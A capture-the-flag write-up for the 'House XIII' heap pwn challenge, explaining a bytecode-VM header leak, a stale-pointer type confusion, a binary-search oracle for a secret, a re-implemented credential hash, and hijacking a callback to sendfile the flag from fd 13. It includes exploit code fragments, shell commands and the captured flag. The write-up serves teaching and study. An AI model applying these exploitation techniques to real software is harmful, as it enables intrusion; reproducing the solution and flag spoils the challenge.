# House XIII

**Category:** Pwn | **Points:** 500 | **Author:** n00b | **Flag:** `zdk{0p3r470r_53ss10n_4cc3p73d}`

## Description
> House XIII is back online. Complete your assignment and return with its authorization material.

Handout: `transit`, `ld-linux-x86-64.so.2`, `libc.so.6` (all excluded from this repo — reference only).

## TL;DR
A heap challenge with a type-confusion twist. One menu op converts a `STARGMTR` object into an `ORBITAL` by freeing and re-allocating the same-size chunk, but it never clears the old pointer — so two tables alias the same memory, and a `STARGMTR` edit op (which doesn't check object type) can rewrite security-sensitive `ORBITAL` fields. A tiny bytecode VM leaks heap/PIE pointers by reading backward into the object header; a comparison op acts as a `<` oracle for a random 64-bit secret (recover it with a 64-step binary search). Recreate the credential hash, swap the callback for an existing `sendfile` routine, point its input fd at 13 (the flag is pre-opened there), and trigger.

## Initial Analysis

```text
Arch:       amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
FORTIFY:    Enabled
```

Everything is on — no naive stack smash. The intended path is through the heap objects and the callback machinery. The binary prints a long "no automated analysis / RE allowed" banner; that's just data inside a CTF pwn binary and doesn't change the task. There are also several decoy `ZDK{...}` strings in `.rodata` (rewards for side conditions), so the real target is the function that calls `sendfile` on a pre-opened descriptor, not any embedded string.

Two arrays of eight pointers exist, one per object type. Both object types use a `0x180`-byte allocation, so glibc recycles a just-freed chunk for the next same-size request. The menu (control codes disguised) is roughly:

| Choice | Behavior |
|---:|---|
| 1 | Allocate a `STARGMTR` |
| 2 | Write bytes into a `STARGMTR` data area |
| 3 | Set a `STARGMTR` bytecode program |
| 4 | Run the bytecode program |
| 5 | Convert a `STARGMTR` into an `ORBITAL` |
| 6 | Store a value in an `ORBITAL` and compare it with the secret |
| 7 | Validate and invoke an `ORBITAL` callback |
| 8 | Delete a `STARGMTR` |
| 9 | Delete an `ORBITAL` |

Object layouts (fields that matter):

```text
STARGMTR                         ORBITAL
+0x00 "STARGMTR" magic           +0x00 "ORBITAL" magic
+0x08 generation                 +0x08 generation
+0x10 pointer to self            +0x60 encoded callback-table address
+0x18 fn ptr = PIE+0x2060        +0x68 credential protecting the callback
+0x20 token/hash                 +0x70 user comparison value
+0x60 128-byte data area         +0x78 fd used by sendfile callback
+0xe0 128-byte bytecode area     +0x7c gate checked by sendfile callback
+0x160 bytecode length           +0x80 link value included in credential
                                 +0x88 receipt/status
```

## Vulnerability / Core Concept

### Bug 1 — VM reads backward into the header (leak)
The VM operates on the data area at object offset `0x60`. Opcode `0x19` adds a *signed* byte to the current data offset, and its range check allows the effective address down to the object base. Starting at `0x60` and adding `-0x60` (byte `0xa0`) lands on the header; opcode `0x2d` prints one byte:

```python
program  = bytes([0x19, 0xA0])                        # move back 0x60
program += b"".join(bytes([0x2D, 0x19, 1]) for _ in range(32))  # print, +1
program += b"\xff"                                    # stop
```

The first 32 bytes reveal the generation (`+0x08`), the heap object address (`+0x10`), and a code pointer (`+0x18`). The code pointer is always `PIE + 0x2060`, so `pie_base = leaked - 0x2060`.

### Bug 2 — stale pointer after conversion (type confusion)
Conversion (choice 5) is roughly:

```c
old = stargmtr_slots[id_a];
free(old);
orbital = calloc(1, 0x180);       // returns the just-freed chunk
orbital_slots[id_b] = orbital;
initialize_orbital(orbital, old->generation);
// BUG: stargmtr_slots[id_a] is never set to NULL
```

Now `stargmtr_slots[0]` and `orbital_slots[0]` alias the same allocation. Choice 2 (STARGMTR write) checks only that the pointer is non-null — **not** the magic — and writes starting at object offset `0x60`, exactly where the sensitive `ORBITAL` callback fields begin. That's a full type-confusion write into the callback machinery.

### Recovering the random secret (oracle)
The callback address at `+0x60` is encoded with a random 64-bit process secret. Choice 6 stores a value at `+0x70`, compares it with the secret, and prints:

```text
status:31  when value <  secret
status:73  when value >= secret
```

One bit per query, but 64 queries suffice via binary search (the 240-second service alarm leaves plenty of time):

```python
low, high = 0, 1 << 64
for _ in range(64):
    mid = (low + high) // 2
    if oracle(mid):   # mid < secret
        low = mid + 1
    else:
        high = mid
secret = low
```

### Recreating the credential
`+0x60` holds an *encoded* address of a read-only callback-table entry: `encoded = rol64(callback_slot ^ secret, 17)`. Before decoding, the program mixes the encoded value, the link at `+0x80`, the object's heap address, and the secret through a custom function (at binary offset `0x1f40`); the result must equal the credential at `+0x68`. Translated to Python:

```python
def finalize(v):
    v = ((v ^ (v >> 30)) * 0xbf58476d1ce4e5b9) & MASK
    v = ((v ^ (v >> 27)) * 0x94d049bb133111eb) & MASK
    return (v ^ (v >> 31)) & MASK

def make_credential(encoded, link, obj, secret):
    x = finalize(rol64(secret, 29) + 0xd1a613c0dec0ffee + encoded)
    y = finalize(ror64(secret, 11) + 0x13f0a5b7c9e2468d + link)
    z = finalize(0xa57ea1c49d2036bf + rol64(secret, 7) + obj)
    combined = (encoded * 0x9e3779b185ebca87) ^ x ^ ror64(z, 9) ^ rol64(y, 23)
    return finalize(combined)
```

With the secret, heap address, and PIE base all leaked, nothing here is unknown.

### The `sendfile` callback
The normal callback-table entry is `PIE + 0x4cf8` (prints a decoy string). The *adjacent* entry eight bytes earlier is the prize:

```text
PIE + 0x4cf0 -> PIE + 0x2160
```

`PIE + 0x2160` does:

```c
if (orbital->gate == 13 && orbital->fd >= 0)
    sendfile(1, orbital->fd, &offset, 0x400);
```

The remote launcher pre-opens the flag on **descriptor 13**, so we forge `fd = 13` and `gate = 13`.

## Exploitation

Full solve in [`solve.py`](solve.py). Chain:

1. Allocate a `STARGMTR`, run the backward-read program → leak generation, heap object, PIE base.
2. Convert (choice 5) → stale `stargmtr_slots[0]` now aliases the new `ORBITAL`.
3. Binary-search the secret via choice 6.
4. Compute `encoded = rol64((pie_base + 0x4cf0) ^ secret, 17)` and its credential (`link = generation ^ (generation + 1)`).
5. Write the forged fields through the stale STARGMTR (choice 2):

```python
forged = flat(
    encoded,            # +0x60
    credential,         # +0x68
    0,                  # +0x70
    p32(13), p32(13),   # +0x78 fd, +0x7c gate
    link,               # +0x80
    0,                  # +0x88
)
write_data(0, 0, forged)
trigger(0)              # choice 7: validate credential, decode, call sendfile
```

### Local testing
`transit` doesn't naturally have a flag on fd 13, so the exploit opens a sentinel file there before launching via the supplied loader:

```bash
exec 13</tmp/house-xiii-local-flag
exec ./ld-linux-x86-64.so.2 --library-path . ./transit
```

which yields `ZDK{LOCAL_FD13_SENDFILE_SUCCESS}` — proving the real `sendfile` path fired rather than a decoy string.

### Remote
The endpoint uses TLS (`ssl=True`):

```bash
./solve.py REMOTE HOST=house-xiii-8c840bd6a406.chals.z0d1ak.org PORT=1337
```

```text
[*] object = 0x555559de8c20
[*] PIE    = 0x7f7fc1dcd000
[*] secret = 0x168b02da0a37612b
[+] zdk{0p3r470r_53ss10n_4cc3p73d}
```

## Flag
`zdk{0p3r470r_53ss10n_4cc3p73d}`

## Key Takeaways
- The scary-looking custom hash is *not* the vulnerability — once every input to it is leaked, faithfully re-implementing it is enough.
- The real chain is several small mistakes combining: a VM offset check that permits header reads, a conversion that leaves a stale pointer, a write op that skips the type check, a status code that leaks comparisons, and a powerful `sendfile` callback already present in the binary.
- A `<`/`>=` status difference is a full binary-search oracle: 64 queries recover any 64-bit secret.
- When a flag is pre-opened on a fixed fd, you don't need code execution — just reach any primitive that reads that fd (here, `sendfile(1, 13, ...)`).
